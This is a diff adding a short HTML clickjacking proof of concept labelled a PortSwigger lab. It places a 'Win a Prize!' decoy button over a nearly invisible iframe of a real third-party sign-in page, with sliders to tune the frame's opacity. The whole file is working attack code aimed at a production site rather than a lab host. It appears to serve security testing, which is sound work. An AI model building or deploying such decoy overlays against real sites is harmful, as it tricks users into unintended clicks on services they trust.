@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Lab - PortSwigger</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        
+        #decoy {
+            position: absolute;
+            top: 500px;
+            left: 60px;
+            z-index: 2;
+        }
+        
+        #decoy button {
+            background: #28a745;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        #target_website {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            opacity: 0.1;  /* Start with very low opacity */
+            z-index: 1;
+        }
+        
+        .controls {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: white;
+            padding: 15px;
+            border: 2px solid #007bff;
+            border-radius: 5px;
+            z-index: 1000;
+            box-shadow: 0 0 10px rgba(0,0,0,0.3);
+        }
+        
+        .controls button {
+            display: block;
+            width: 100%;
+            margin: 5px 0;
+            padding: 8px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        
+        .controls input {
+            width: 100%;
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="controls">
+        <h4>Controls</h4>
+        <label>Opacity: <span id="opVal">10%</span></label>
+        <input type="range" id="opacityControl" min="0" max="100" value="10" 
+               oninput="updateOpacity(this.value)">
+        <button onclick="setOpacity(0)">Hide Frame (0%)</button>
+        <button onclick="setOpacity(10)">Show Frame (10%)</button>
+        <button onclick="setOpacity(100)">Full Visible (100%)</button>
+    </div>
+    
+    <div id="decoy">
+        <h1>🎁 Win a Prize!</h1>
+        <p>Click the button below:</p>
+        <button>Click me</button>
+    </div>
+    
+    <iframe id="target_website" src="https://account.mapbox.com/auth/signin"></iframe>
+    
+    <script>
+        function updateOpacity(value) {
+            document.getElementById('target_website').style.opacity = value / 100;
+            document.getElementById('opVal').textContent = value + '%';
+        }
+        
+        function setOpacity(value) {
+            document.getElementById('opacityControl').value = value;
+            updateOpacity(value);
+        }
+    </script>
+</body>
+</html>
